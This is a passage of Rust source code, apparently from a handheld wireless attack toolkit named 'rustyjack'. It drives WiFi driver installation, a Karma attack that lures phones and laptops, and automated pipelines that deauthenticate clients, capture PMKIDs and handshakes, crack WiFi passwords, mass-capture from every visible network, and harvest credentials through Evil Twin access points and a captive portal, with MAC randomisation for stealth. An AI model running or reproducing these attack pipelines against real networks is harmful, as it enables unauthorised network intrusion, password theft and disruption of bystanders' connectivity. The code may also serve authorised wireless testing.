                                    return self.show_message(
                                        "No Devices",
                                        [
                                            "No USB WiFi adapters",
                                            "were detected.",
                                            "",
                                            "Please plug in a USB",
                                            "WiFi adapter and try",
                                            "again.",
                                        ],
                                    );
                                }
                                "FAILED" => {
                                    return self.show_message(
                                        "Driver Failed",
                                        [
                                            "Failed to install drivers",
                                            "",
                                            details,
                                            "",
                                            "Check internet connection",
                                            "and try again.",
                                            "",
                                            "Some adapters may not",
                                            "be supported.",
                                        ],
                                    );
                                }
                                _ => {
                                    return self.show_message(
                                        "Unknown Result",
                                        [&format!("Status: {}", status), details],
                                    );
                                }
                            }
                        }
                    }

                    // No result file - use exit code
                    if exit_code == 0 {
                        return self.show_message("Driver Install", ["Installation completed"]);
                    } else if exit_code == 2 {
                        return self.show_message(
                            "Reboot Required",
                            [
                                "Driver installed.",
                                "Reboot required to",
                                "complete setup.",
                                "",
                                "Press KEY3 to reboot",
                            ],
                        );
                    } else {
                        return self.show_message(
                            "Driver Failed",
                            [
                                "Installation failed",
                                "",
                                &format!("Exit code: {}", exit_code),
                                "",
                                "Check logs at:",
                                "/var/log/rustyjack_wifi_driver.log",
                            ],
                        );
                    }
                }
                Ok(None) => {
                    // Still running - update status display
                    if let Ok(status) = fs::read_to_string(status_file) {
                        let status = status.trim();
                        if status != last_status {
                            last_status = status.to_string();

                            // Parse status and show appropriate message
                            let (title, messages) = self.parse_driver_status(&last_status, ticks);
                            self.display.draw_menu(
                                &title,
                                &messages,
                                usize::MAX,
                                &self.stats.snapshot(),
                            )?;
                        }
                    }

                    // Animate waiting indicator
                    ticks += 1;
                    thread::sleep(Duration::from_millis(500));

                    // Check for user cancel (back button)
                    if let Ok(Some(btn)) = self.buttons.try_read() {
                        if matches!(self.map_button(btn), ButtonAction::Back) {
                            // User cancelled - try to kill process
                            let _ = child.kill();
                            return self
                                .show_message("Cancelled", ["Installation cancelled by user"]);
                        }
                    }
                }
                Err(e) => {
                    return self
                        .show_message("Error", ["Failed to check process", &format!("{}", e)]);
                }
            }
        }
    }

    /// Parse driver installer status into display messages
    fn parse_driver_status(&self, status: &str, ticks: u32) -> (String, Vec<String>) {
        let spinner = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"][(ticks as usize) % 10];

        let parts: Vec<&str> = status.split(':').collect();

        match parts.get(0).map(|s| *s) {
            Some("SCANNING") => (
                "WiFi Driver".to_string(),
                vec![
                    format!("{} Scanning USB devices...", spinner),
                    "".to_string(),
                    "Looking for WiFi".to_string(),
                    "adapters...".to_string(),
                ],
            ),
            Some("DETECTED") => {
                let chipset = parts.get(1).unwrap_or(&"Unknown");
                (
                    "Device Found".to_string(),
                    vec![
                        format!("Chipset: {}", chipset),
                        "".to_string(),
                        format!("{} Preparing driver...", spinner),
                    ],
                )
            }
            Some("INSTALLING_PREREQUISITES") => (
                "Prerequisites".to_string(),
                vec![
                    format!("{} Installing build tools", spinner),
                    "".to_string(),
                    "This may take a few".to_string(),
                    "minutes...".to_string(),
                ],
            ),
            Some("INSTALLING_DRIVER") => {
                let package = parts.get(1).unwrap_or(&"driver");
                (
                    "Installing Driver".to_string(),
                    vec![
                        format!("Package: {}", package),
                        "".to_string(),
                        format!("{} Compiling...", spinner),
                        "".to_string(),
                        "This may take 5-10".to_string(),
                        "minutes on Pi Zero".to_string(),
                    ],
                )
            }
            Some("VERIFYING") => {
                let iface = parts.get(1).unwrap_or(&"wlan");
                (
                    "Verifying".to_string(),
                    vec![
                        format!("{} Testing interface", spinner),
                        "".to_string(),
                        format!("Interface: {}", iface),
                        "Checking functionality...".to_string(),
                    ],
                )
            }
            Some("BUILTIN") => {
                let chipset = parts.get(1).unwrap_or(&"Unknown");
                (
                    "Built-in Driver".to_string(),
                    vec![
                        format!("Chipset: {}", chipset),
                        "".to_string(),
                        format!("{} Loading firmware...", spinner),
                    ],
                )
            }
            Some("UNKNOWN") => {
                let usb_id = parts.get(1).unwrap_or(&"????:????");
                (
                    "Unknown Device".to_string(),
                    vec![
                        format!("USB ID: {}", usb_id),
                        "".to_string(),
                        "No driver available".to_string(),
                        "for this device.".to_string(),
                    ],
                )
            }
            _ => (
                "WiFi Driver".to_string(),
                vec![
                    format!("{} Working...", spinner),
                    "".to_string(),
                    status.to_string(),
                ],
            ),
        }
    }

    /// Launch Karma attack
    fn launch_karma_attack(&mut self) -> Result<()> {
        if !self.mode_allows_active("Karma attack blocked in Stealth mode")? {
            return Ok(());
        }
        let active_interface = self.config.settings.active_network_interface.clone();

        if active_interface.is_empty() {
            return self.show_message(
                "Karma Attack",
                [
                    "No WiFi interface set",
                    "",
                    "Run Hardware Detect",
                    "to configure interface",
                ],
            );
        }

        if !check_monitor_mode_support(&active_interface) {
            return self.show_message(
                "Hardware Error",
                [
                    "Interface does not",
                    "support monitor mode.",
                    "",
                    "External adapter required",
                ],
            );
        }

        // Explain what Karma does
        self.show_message(
            "Karma Attack",
            [
                "Responds to ALL probe",
                "requests from devices.",
                "",
                "Captures clients looking",
                "for known networks.",
                "",
                "Very effective against",
                "phones and laptops!",
                "",
                "Press SELECT to start",
            ],
        )?;

        // Duration selection
        let durations = vec![
            "2 minutes".to_string(),
            "5 minutes".to_string(),
            "10 minutes".to_string(),
            "Indefinite".to_string(),
        ];
        let dur_choice = self.choose_from_list("Karma Duration", &durations)?;

        let duration = match dur_choice {
            Some(0) => 120,
            Some(1) => 300,
            Some(2) => 600,
            Some(3) => INDEFINITE_SECS,
            _ => return Ok(()),
        };

        if duration == INDEFINITE_SECS {
            self.show_message(
                "Karma Attack",
                [
                    "Running indefinitely.",
                    "Press LEFT/Main Menu",
                    "to stop. Elapsed shown.",
                ],
            )?;
        }

        // Ask if they want to create a fake AP
        let ap_options = vec![
            "Passive (sniff only)".to_string(),
            "Active (create fake AP)".to_string(),
            "Cancel".to_string(),
        ];
        let ap_choice = self.choose_from_menu("Karma Mode", &ap_options)?;

        let with_ap = match ap_choice {
            Some(0) => false,
            Some(1) => true,
            _ => return Ok(()),
        };

        // Execute via core with cancel support
        use rustyjack_core::{Commands, WifiCommand, WifiKarmaArgs};

        let cmd = Commands::Wifi(WifiCommand::Karma(WifiKarmaArgs {
            interface: active_interface.clone(),
            ap_interface: if with_ap {
                Some(active_interface.clone())
            } else {
                None
            },
            duration,
            channel: 0, // hop channels
            with_ap,
            ssid_whitelist: None,
            ssid_blacklist: None,
        }));

        let result = self.dispatch_cancellable("Karma Attack", cmd, duration as u64)?;

        let Some((msg, data)) = result else {
            return Ok(()); // Cancelled
        };

        let mut lines = vec![msg];

        if let Some(probes) = data.get("probes_seen").and_then(|v| v.as_u64()) {
            lines.push(format!("Probes: {}", probes));
        }
        if let Some(ssids) = data.get("unique_ssids").and_then(|v| v.as_u64()) {
            lines.push(format!("SSIDs: {}", ssids));
        }
        if let Some(clients) = data.get("unique_clients").and_then(|v| v.as_u64()) {
            lines.push(format!("Clients: {}", clients));
        }
        if let Some(victims) = data.get("victims").and_then(|v| v.as_u64()) {
            if victims > 0 {
                lines.push(format!("Victims: {}", victims));
            }
        }

        self.show_message("Karma Done", lines.iter().map(|s| s.as_str()))?;

        Ok(())
    }

    /// Launch an attack pipeline
    fn launch_attack_pipeline(&mut self, pipeline_type: PipelineType) -> Result<()> {
        let active_interface = self.config.settings.active_network_interface.clone();

        if self
            .config
            .settings
            .operation_mode
            .eq_ignore_ascii_case("stealth")
            && pipeline_type != PipelineType::StealthRecon
        {
            return self.show_message(
                "Stealth Mode",
                [
                    "Pipelines are blocked",
                    "in Stealth (traceable)",
                    "Only Stealth Recon",
                    "pipeline is permitted.",
                ],
            );
        }

        if active_interface.is_empty() {
            return self.show_message(
                "Attack Pipeline",
                [
                    "No WiFi interface set",
                    "",
                    "Run Hardware Detect",
                    "to configure interface",
                ],
            );
        }

        if !check_monitor_mode_support(&active_interface) {
            return self.show_message(
                "Hardware Error",
                [
                    "Interface does not",
                    "support monitor mode.",
                    "",
                    "External adapter required",
                ],
            );
        }

        let (title, description, steps) = match pipeline_type {
            PipelineType::GetPassword => (
                "Get WiFi Password",
                "Automated sequence to obtain target WiFi password",
                vec![
                    "1. Scan networks",
                    "2. PMKID capture",
                    "3. Deauth attack",
                    "4. Capture handshake",
                    "5. Quick crack",
                ],
            ),
            PipelineType::MassCapture => (
                "Mass Capture",
                "Capture handshakes from all visible networks",
                vec![
                    "1. Scan all networks",
                    "2. Channel hopping",
                    "3. Multi-target deauth",
                    "4. Continuous capture",
                ],
            ),
            PipelineType::StealthRecon => (
                "Stealth Recon",
                "Passive reconnaissance with NO transmission",
                vec![
                    "1. Randomize MAC",
                    "2. Minimum TX power",
                    "3. Passive scan only",
                    "4. Probe sniffing",
                ],
            ),
            PipelineType::CredentialHarvest => (
                "Credential Harvest",
                "Capture login credentials via fake networks",
                vec![
                    "1. Probe sniff",
                    "2. Karma attack",
                    "3. Evil Twin APs",
                    "4. Captive portal",
                ],
            ),
            PipelineType::FullPentest => (
                "Full Pentest",
                "Complete automated wireless audit",
                vec![
                    "1. Stealth recon",
                    "2. Network mapping",
                    "3. PMKID harvest",
                    "4. Deauth attacks",
                    "5. Evil Twin/Karma",
                    "6. Crack passwords",
                ],
            ),
        };

        // Show pipeline description with text wrapping
        let mut all_lines: Vec<String> = Vec::new();
        all_lines.push(description.to_string());
        all_lines.push("".to_string());
        all_lines.push("Steps:".to_string());
        for step in &steps {
            all_lines.push(step.to_string());
        }
        all_lines.push("".to_string());
        all_lines.push("SELECT = Start".to_string());

        self.show_message(title, all_lines.iter().map(|s| s.as_str()))?;

        // Confirm
        let options = vec!["Start Pipeline".to_string(), "Cancel".to_string()];
        let choice = self.choose_from_list("Confirm", &options)?;

        if choice != Some(0) {
            return Ok(());
        }

        // If target needed and not set, prompt for network selection
        let needs_target = matches!(
            pipeline_type,
            PipelineType::GetPassword | PipelineType::CredentialHarvest
        );

        if needs_target && self.config.settings.target_network.is_empty() {
            self.show_message(
                "Select Target",
                ["No target network set", "", "Scanning networks..."],
            )?;

            // Scan and let user pick target
            self.scan_wifi_networks()?;

            // Check if user selected a target
            if self.config.settings.target_network.is_empty() {
                return self.show_message(
                    "Pipeline Cancelled",
                    ["No target selected", "", "Select a network first"],
                );
            }
        }

        let target_dir = self.pipeline_target_dir();
        let (pipeline_dir, started_at) = self.prepare_pipeline_loot_dir(&target_dir)?;

        // Execute pipeline steps using actual attack implementations
        let result = self.execute_pipeline_steps(pipeline_type, title, &steps)?;
        let loot_copy = self.capture_pipeline_loot(started_at, &target_dir, &pipeline_dir);
        let loot_dir_display = pipeline_dir
            .strip_prefix(&self.root)
            .unwrap_or(&pipeline_dir)
            .display()
            .to_string();
        let (loot_status_line, loot_detail_line) = match loot_copy {
            Ok(copied) => (
                format!("Loot: {}", loot_dir_display),
                Some(format!("Files copied: {}", copied)),
            ),
            Err(e) => {
                eprintln!("[pipeline] loot copy failed: {e:?}");
                (
                    format!("Loot: {} (copy failed)", loot_dir_display),
                    Some(format!("{e}")),
                )
            }
        };

        // Pipeline complete - show results
        if result.cancelled {
            let mut lines: Vec<String> = vec![
                format!("Stopped at step {}", result.steps_completed + 1),
                "".to_string(),
                "Partial results may be".to_string(),
                "saved in loot folder".to_string(),
            ];
            lines.push("".to_string());
            lines.push(loot_status_line);
            if let Some(detail) = loot_detail_line {
                lines.push(detail);
            }
            self.show_message("Pipeline Cancelled", lines)
        } else {
            let mut summary = vec![format!("{} finished", title), "".to_string()];

            if result.pmkids_captured > 0 {
                summary.push(format!("PMKIDs: {}", result.pmkids_captured));
            }
            if result.handshakes_captured > 0 {
                summary.push(format!("Handshakes: {}", result.handshakes_captured));
            }
            if let Some(ref password) = result.password_found {
                summary.push(format!("PASSWORD: {}", password));
            }
            if result.networks_found > 0 {
                summary.push(format!("Networks: {}", result.networks_found));
            }
            if result.clients_found > 0 {
                summary.push(format!("Clients: {}", result.clients_found));
            }

            summary.push("".to_string());
            summary.push(loot_status_line);
            if let Some(detail) = loot_detail_line {
                summary.push(detail);
            }

            self.show_message("Pipeline Complete", summary.iter().map(|s| s.as_str()))
        }
    }

    fn prepare_pipeline_loot_dir(&self, target_dir: &Path) -> Result<(PathBuf, SystemTime)> {
        fs::create_dir_all(target_dir)
            .with_context(|| format!("creating target loot directory {}", target_dir.display()))?;
        let pipelines_root = target_dir.join("pipelines");
        fs::create_dir_all(&pipelines_root).with_context(|| {
            format!("creating pipelines directory {}", pipelines_root.display())
        })?;
        let ts = Local::now().format("%Y%m%d_%H%M%S").to_string();
        let run_dir = pipelines_root.join(ts);
        fs::create_dir_all(&run_dir)
            .with_context(|| format!("creating pipeline run directory {}", run_dir.display()))?;
        Ok((run_dir, SystemTime::now()))
    }

    fn pipeline_target_dir(&self) -> PathBuf {
        let settings = &self.config.settings;
        let name_source = if !settings.target_network.is_empty() {
            settings.target_network.clone()
        } else if !settings.target_bssid.is_empty() {
            settings.target_bssid.clone()
        } else {
            "Unknown".to_string()
        };
        let safe = Self::sanitize_target_name(&name_source);
        self.root.join("loot").join("Wireless").join(safe)
    }

    fn sanitize_target_name(name: &str) -> String {
        let mut out = String::with_capacity(name.len());
        for ch in name.chars() {
            if ch.is_ascii_alphanumeric() || ch == '-' || ch == '_' {
                out.push(ch);
            } else {
                out.push('_');
            }
        }
        let trimmed = out.trim_matches('_').to_string();
        if trimmed.is_empty() {
            "Unknown".to_string()
        } else {
            trimmed
        }
    }

    fn capture_pipeline_loot(
        &self,
        started_at: SystemTime,
        target_dir: &Path,
        pipeline_dir: &Path,
    ) -> Result<usize> {
        let wireless_base = self.root.join("loot").join("Wireless");
        if !wireless_base.exists() {
            return Ok(0);
        }

        let mut copied = 0usize;
        for entry in WalkDir::new(&wireless_base)
            .into_iter()
            .filter_entry(|e| !e.path().starts_with(pipeline_dir))
        {
            let entry = entry?;
            let path = entry.path();
            if path.is_dir() {
                continue;
            }
            let metadata = match entry.metadata() {
                Ok(m) => m,
                Err(_) => continue,
            };
            let modified = match metadata.modified() {
                Ok(t) => t,
                Err(_) => continue,
            };
            if modified < started_at {
                continue;
            }

            let rel = if path.starts_with(target_dir) {
                path.strip_prefix(target_dir).unwrap_or(path)
            } else if path.starts_with(&wireless_base) {
                path.strip_prefix(&wireless_base).unwrap_or(path)
            } else {
                continue;
            };

            if rel.as_os_str().is_empty() {
                continue;
            }

            let dest = pipeline_dir.join(rel);
            if let Some(parent) = dest.parent() {
                fs::create_dir_all(parent)
                    .with_context(|| format!("creating {}", parent.display()))?;
            }
            fs::copy(path, &dest)
                .with_context(|| format!("copying {} to {}", path.display(), dest.display()))?;
            copied += 1;
        }

        Ok(copied)
    }

    /// Execute the actual pipeline steps using real attack implementations
    fn execute_pipeline_steps(
        &mut self,
        pipeline_type: PipelineType,
        title: &str,
        steps: &[&str],
    ) -> Result<PipelineResult> {
        let mut result = PipelineResult {
            cancelled: false,
            steps_completed: 0,
            pmkids_captured: 0,
            handshakes_captured: 0,
            password_found: None,
            networks_found: 0,
            clients_found: 0,
        };

        let active_interface = self.config.settings.active_network_interface.clone();
        let target_bssid = self.config.settings.target_bssid.clone();
        let target_channel = self.config.settings.target_channel;
        let target_ssid = self.config.settings.target_network.clone();
        let total_steps = steps.len();

        for (i, step) in steps.iter().enumerate() {
            // Check for cancel before each step
            match self.check_attack_cancel(title)? {
                CancelAction::Continue => {}
                CancelAction::GoBack | CancelAction::GoMainMenu => {
                    result.cancelled = true;
                    return Ok(result);
                }
            }

            // Show progress
            let progress = (i as f32 / total_steps as f32) * 100.0;
            let overlay = self.stats.snapshot();
            self.display.draw_progress_dialog(
                title,
                &format!("{} [LEFT=Cancel]", step),
                progress,
                &overlay,
            )?;

            // Execute the step based on pipeline type and step index
            let step_result = match pipeline_type {
                PipelineType::GetPassword => self.execute_get_password_step(
                    i,
                    &active_interface,
                    &target_bssid,
                    target_channel,
                    &target_ssid,
                )?,
                PipelineType::MassCapture => {
                    self.execute_mass_capture_step(i, &active_interface)?
                }
                PipelineType::StealthRecon => {
                    self.execute_stealth_recon_step(i, &active_interface)?
                }
                PipelineType::CredentialHarvest => self.execute_credential_harvest_step(
                    i,
                    &active_interface,
                    &target_ssid,
                    target_channel,
                )?,
                PipelineType::FullPentest => self.execute_full_pentest_step(
                    i,
                    &active_interface,
                    &target_bssid,
                    target_channel,
                    &target_ssid,
                )?,
            };

            // Update result from step
            match step_result {
                StepOutcome::Completed(Some((pmkids, handshakes, password, networks, clients))) => {
                    result.pmkids_captured += pmkids;
                    result.handshakes_captured += handshakes;
                    if password.is_some() {
                        result.password_found = password;
                    }
                    result.networks_found += networks;
                    result.clients_found += clients;
                }
                StepOutcome::Completed(None) => {}
                StepOutcome::Skipped(reason) => {
                    result.cancelled = true;
                    self.show_message(
                        "Pipeline stopped",
                        [&format!("Step {} halted", i + 1), "", &reason],
                    )?;
                    return Ok(result);
                }
            }

            result.steps_completed = i + 1;

            // If we found the password in GetPassword pipeline, we can stop early
            if pipeline_type == PipelineType::GetPassword && result.password_found.is_some() {
                break;
            }
        }

        Ok(result)
    }

    /// Execute a step in the GetPassword pipeline
    /// Returns (pmkids, handshakes, password, networks, clients)
    fn execute_get_password_step(
        &mut self,
        step: usize,
        interface: &str,
        bssid: &str,
        channel: u8,
        ssid: &str,
    ) -> Result<StepOutcome> {
        use rustyjack_core::{Commands, WifiCommand, WifiDeauthArgs, WifiPmkidArgs, WifiScanArgs};

        match step {
            0 => {
                // Step 1: Scan networks
                let cmd = Commands::Wifi(WifiCommand::Scan(WifiScanArgs {
                    interface: Some(interface.to_string()),
                }));
                if let Some((_, data)) = self.dispatch_cancellable("Scanning", cmd, 20)? {
                    let count = data.get("count").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
                    return Ok(StepOutcome::Completed(Some((0, 0, None, count, 0))));
                }
            }
            1 => {
                // Step 2: PMKID capture
                if bssid.is_empty() {
                    return Ok(StepOutcome::Skipped(
                        "Target BSSID not set; select a network first".to_string(),
                    ));
                }
                let cmd = Commands::Wifi(WifiCommand::PmkidCapture(WifiPmkidArgs {
                    interface: interface.to_string(),
                    bssid: Some(bssid.to_string()),
                    ssid: Some(ssid.to_string()),
                    channel,
                    duration: 30,
                }));
                if let Some((_, data)) = self.dispatch_cancellable("PMKID", cmd, 35)? {
                    let pmkids = data
                        .get("pmkids_captured")
                        .and_then(|v| v.as_u64())
                        .unwrap_or(0) as u32;
                    return Ok(StepOutcome::Completed(Some((pmkids, 0, None, 0, 0))));
                }
            }
            2 => {
                // Step 3: Deauth attack
                if bssid.is_empty() {
                    return Ok(StepOutcome::Skipped(
                        "Target BSSID not set; select a network first".to_string(),
                    ));
                }
                let cmd = Commands::Wifi(WifiCommand::Deauth(WifiDeauthArgs {
                    interface: interface.to_string(),
                    bssid: bssid.to_string(),
                    ssid: Some(ssid.to_string()),
                    client: None,
                    channel,
                    packets: 64,
                    duration: 30,
                    continuous: true,
                    interval: 1,
                }));
                if let Some((_, data)) = self.dispatch_cancellable("Deauth", cmd, 35)? {
                    let handshakes = if data
                        .get("handshake_captured")
                        .and_then(|v| v.as_bool())
                        .unwrap_or(false)
                    {
                        1
                    } else {
                        0
                    };
                    return Ok(StepOutcome::Completed(Some((0, handshakes, None, 0, 0))));
                }
            }
            3 => {
                // Step 4: Handshake capture (continuation of deauth with longer capture)
                if bssid.is_empty() {
                    return Ok(StepOutcome::Skipped(
                        "Target BSSID not set; select a network first".to_string(),
                    ));
                }
                let cmd = Commands::Wifi(WifiCommand::Deauth(WifiDeauthArgs {
                    interface: interface.to_string(),
                    bssid: bssid.to_string(),
                    ssid: Some(ssid.to_string()),
                    client: None,
                    channel,
                    packets: 32,
                    duration: 60,
                    continuous: true,
                    interval: 1,
                }));
                if let Some((_, data)) = self.dispatch_cancellable("Capture", cmd, 65)? {
                    let handshakes = if data
                        .get("handshake_captured")
                        .and_then(|v| v.as_bool())
                        .unwrap_or(false)
                    {
                        1
                    } else {
                        0
                    };
                    return Ok(StepOutcome::Completed(Some((0, handshakes, None, 0, 0))));
                }
            }
            4 => {
                // Step 5: Quick crack - look for handshake files and try to crack
                let loot_dir = self.root.join("loot/Wireless");
                if loot_dir.exists() {
                    // Find the most recent handshake export
                    if let Some(handshake_path) = self.find_recent_handshake(&loot_dir) {
                        use rustyjack_core::cli::WifiCrackArgs;
                        let cmd = Commands::Wifi(WifiCommand::Crack(WifiCrackArgs {
                            file: handshake_path.to_string_lossy().to_string(),
                            ssid: Some(ssid.to_string()),
                            mode: "quick".to_string(),
                            wordlist: None,
                        }));
                        if let Some((_msg, data)) =
                            self.dispatch_cancellable("Cracking", cmd, 120)?
                        {
                            if let Some(password) = data.get("password").and_then(|v| v.as_str()) {
                                return Ok(StepOutcome::Completed(Some((
                                    0,
                                    0,
                                    Some(password.to_string()),
                                    0,
                                    0,
                                ))));
                            }
                        }
                    }
                }
                return Ok(StepOutcome::Skipped(
                    "No captured handshake available to crack".to_string(),
                ));
            }
            _ => {}
        }
        Ok(StepOutcome::Completed(None))
    }

    /// Execute a step in the MassCapture pipeline
    fn execute_mass_capture_step(&mut self, step: usize, interface: &str) -> Result<StepOutcome> {
        use rustyjack_core::{Commands, WifiCommand, WifiPmkidArgs, WifiScanArgs};

        match step {
            0 => {
                // Step 1: Scan all networks
                let cmd = Commands::Wifi(WifiCommand::Scan(WifiScanArgs {
                    interface: Some(interface.to_string()),
                }));
                if let Some((_, data)) = self.dispatch_cancellable("Scanning", cmd, 35)? {
                    let count = data.get("count").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
                    return Ok(StepOutcome::Completed(Some((0, 0, None, count, 0))));
                }
            }
            1 => {
                // Step 2: Channel hopping scan (longer passive scan)
                let cmd = Commands::Wifi(WifiCommand::Scan(WifiScanArgs {
                    interface: Some(interface.to_string()),
                }));
                if let Some((_, data)) = self.dispatch_cancellable("Ch. Hop", cmd, 50)? {
                    let count = data.get("count").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
                    return Ok(StepOutcome::Completed(Some((0, 0, None, count, 0))));
                }
            }
            2 => {
                // Step 3: Multi-target PMKID capture (passive, all networks)
                let cmd = Commands::Wifi(WifiCommand::PmkidCapture(WifiPmkidArgs {
                    interface: interface.to_string(),
                    bssid: None,
                    ssid: None,
                    channel: 0, // Hop through channels
                    duration: 90,
                }));
                if let Some((_, data)) = self.dispatch_cancellable("PMKID", cmd, 100)? {
                    let pmkids = data
                        .get("pmkids_captured")
                        .and_then(|v| v.as_u64())
                        .unwrap_or(0) as u32;
                    return Ok(StepOutcome::Completed(Some((pmkids, 0, None, 0, 0))));
                }
            }
            3 => {
                // Step 4: Continuous capture (probe sniffing for client info)
                use rustyjack_core::WifiProbeSniffArgs;
                let cmd = Commands::Wifi(WifiCommand::ProbeSniff(WifiProbeSniffArgs {
                    interface: interface.to_string(),
                    channel: 0,
                    duration: 60,
                }));
                if let Some((_, data)) = self.dispatch_cancellable("Capture", cmd, 70)? {
                    let clients = data
                        .get("unique_clients")
                        .and_then(|v| v.as_u64())
                        .unwrap_or(0) as u32;
                    let networks = data
                        .get("unique_networks")
                        .and_then(|v| v.as_u64())
                        .unwrap_or(0) as u32;
                    return Ok(StepOutcome::Completed(Some((
                        0, 0, None, networks, clients,
                    ))));
                }
            }
            _ => {}
        }
        Ok(StepOutcome::Completed(None))
    }

    /// Execute a step in the StealthRecon pipeline
    fn execute_stealth_recon_step(&mut self, step: usize, interface: &str) -> Result<StepOutcome> {
        use rustyjack_core::{Commands, WifiCommand, WifiProbeSniffArgs};

        match step {
            0 => {
                // Step 1: Randomize MAC
                #[cfg(target_os = "linux")]
                {
                    let _ = randomize_mac_with_reconnect(interface);
                }
                thread::sleep(Duration::from_secs(2));
                return Ok(StepOutcome::Completed(Some((0, 0, None, 0, 0))));
            }
            1 => {
                // Step 2: Minimum TX power
                #[cfg(target_os = "linux")]
                {
                    use std::process::Command;
                    let _ = Command::new("iw")
                        .args(["dev", interface, "set", "txpower", "fixed", "100"]) // 1 dBm
                        .output();
                }
                thread::sleep(Duration::from_secs(1));
                return Ok(StepOutcome::Completed(Some((0, 0, None, 0, 0))));
            }
            2 => {
                // Step 3: Passive scan only (no probe requests sent)
                // Use probe sniff which is passive
                let cmd = Commands::Wifi(WifiCommand::ProbeSniff(WifiProbeSniffArgs {
                    interface: interface.to_string(),
                    channel: 0,
                    duration: 60,
                }));
                if let Some((_, data)) = self.dispatch_cancellable("Passive", cmd, 70)? {
                    let networks = data
                        .get("unique_networks")
                        .and_then(|v| v.as_u64())
                        .unwrap_or(0) as u32;
                    return Ok(StepOutcome::Completed(Some((0, 0, None, networks, 0))));
                }
            }
            3 => {
                // Step 4: Extended probe sniffing
                let cmd = Commands::Wifi(WifiCommand::ProbeSniff(WifiProbeSniffArgs {
                    interface: interface.to_string(),
                    channel: 0,
                    duration: 120,
                }));
                if let Some((_, data)) = self.dispatch_cancellable("Sniffing", cmd, 130)? {
                    let clients = data
                        .get("unique_clients")
                        .and_then(|v| v.as_u64())
                        .unwrap_or(0) as u32;
                    let networks = data
                        .get("unique_networks")
                        .and_then(|v| v.as_u64())
                        .unwrap_or(0) as u32;
                    return Ok(StepOutcome::Completed(Some((
                        0, 0, None, networks, clients,
                    ))));
                }
            }
            _ => {}
        }
        Ok(StepOutcome::Completed(None))
    }

    /// Execute a step in the CredentialHarvest pipeline
    fn execute_credential_harvest_step(
        &mut self,
        step: usize,
        interface: &str,
        ssid: &str,
        channel: u8,
    ) -> Result<StepOutcome> {
        use rustyjack_core::{
            Commands, WifiCommand, WifiEvilTwinArgs, WifiKarmaArgs, WifiProbeSniffArgs,
        };

        match step {
            0 => {
                // Step 1: Probe sniff to find target networks
                let cmd = Commands::Wifi(WifiCommand::ProbeSniff(WifiProbeSniffArgs {
                    interface: interface.to_string(),
                    channel: 0,
                    duration: 30,
                }));
                if let Some((_, data)) = self.dispatch_cancellable("Sniffing", cmd, 40)? {
                    let networks = data
                        .get("unique_networks")
                        .and_then(|v| v.as_u64())
                        .unwrap_or(0) as u32;
                    let clients = data
                        .get("unique_clients")
                        .and_then(|v| v.as_u64())
                        .unwrap_or(0) as u32;
                    return Ok(StepOutcome::Completed(Some((
                        0, 0, None, networks, clients,
                    ))));
                }
            }
            1 => {
                // Step 2: Karma attack
                let cmd = Commands::Wifi(WifiCommand::Karma(WifiKarmaArgs {
                    interface: interface.to_string(),
                    duration: 60,
                    channel: if channel > 0 { channel } else { 6 },
                    ap_interface: None,
                    with_ap: false,
                    ssid_whitelist: None,
                    ssid_blacklist: None,
                }));
                if let Some((_, data)) = self.dispatch_cancellable("Karma", cmd, 70)? {
                    let clients = data.get("victims").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
                    return Ok(StepOutcome::Completed(Some((0, 0, None, 0, clients))));
                }
            }
            2 => {
                // Step 3: Evil Twin AP
                if ssid.is_empty() {
                    return Ok(StepOutcome::Skipped(
                        "Target SSID not set; select a network first".to_string(),
                    ));
                }
                let cmd = Commands::Wifi(WifiCommand::EvilTwin(WifiEvilTwinArgs {
                    interface: interface.to_string(),
                    ssid: ssid.to_string(),
                    channel: if channel > 0 { channel } else { 6 },
                    duration: 90,
                    target_bssid: None,
                    open: true,
                }));
                if let Some((_, data)) = self.dispatch_cancellable("Evil Twin", cmd, 100)? {
                    let clients = data
                        .get("clients_connected")
                        .and_then(|v| v.as_u64())
                        .unwrap_or(0) as u32;
                    let handshakes = data
                        .get("handshakes_captured")
                        .and_then(|v| v.as_u64())
                        .unwrap_or(0) as u32;
                    return Ok(StepOutcome::Completed(Some((
                        0, handshakes, None, 0, clients,
                    ))));
                }
            }
            3 => {
                // Step 4: Captive portal (continuation of Evil Twin)
                // Evil Twin with open network serves as captive portal
                thread::sleep(Duration::from_secs(5));
                return Ok(StepOutcome::Completed(Some((0, 0, None, 0, 0))));
            }
            _ => {}
        }
        Ok(StepOutcome::Completed(None))
    }

    /// Execute a step in the FullPentest pipeline
    fn execute_full_pentest_step(
        &mut self,
        step: usize,
        interface: &str,
        bssid: &str,
        channel: u8,
        ssid: &str,
    ) -> Result<StepOutcome> {
        use rustyjack_core::{
            Commands, WifiCommand, WifiDeauthArgs, WifiKarmaArgs, WifiPmkidArgs,
            WifiProbeSniffArgs, WifiScanArgs,
        };

        match step {
            0 => {
                // Step 1: Stealth recon - MAC randomization + passive scan
                #[cfg(target_os = "linux")]
                {
                    let _ = randomize_mac_with_reconnect(interface);
                }
                let cmd = Commands::Wifi(WifiCommand::ProbeSniff(WifiProbeSniffArgs {
                    interface: interface.to_string(),
                    channel: 0,
                    duration: 45,
                }));
                if let Some((_, data)) = self.dispatch_cancellable("Recon", cmd, 55)? {
                    let networks = data
                        .get("unique_networks")
                        .and_then(|v| v.as_u64())
                        .unwrap_or(0) as u32;
                    let clients = data
                        .get("unique_clients")
                        .and_then(|v| v.as_u64())
                        .unwrap_or(0) as u32;
                    return Ok(StepOutcome::Completed(Some((
                        0, 0, None, networks, clients,
                    ))));
                }
            }
            1 => {
                // Step 2: Network mapping (active scan)
                let cmd = Commands::Wifi(WifiCommand::Scan(WifiScanArgs {
                    interface: Some(interface.to_string()),
                }));
                if let Some((_, data)) = self.dispatch_cancellable("Mapping", cmd, 40)? {
                    let count = data.get("count").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
                    return Ok(StepOutcome::Completed(Some((0, 0, None, count, 0))));
                }
            }
            2 => {
                // Step 3: PMKID harvest
                let cmd = Commands::Wifi(WifiCommand::PmkidCapture(WifiPmkidArgs {
                    interface: interface.to_string(),
                    bssid: if bssid.is_empty() {
                        None
                    } else {
                        Some(bssid.to_string())
                    },
                    ssid: if ssid.is_empty() {
                        None
                    } else {
                        Some(ssid.to_string())
                    },
                    channel: if channel > 0 { channel } else { 0 },
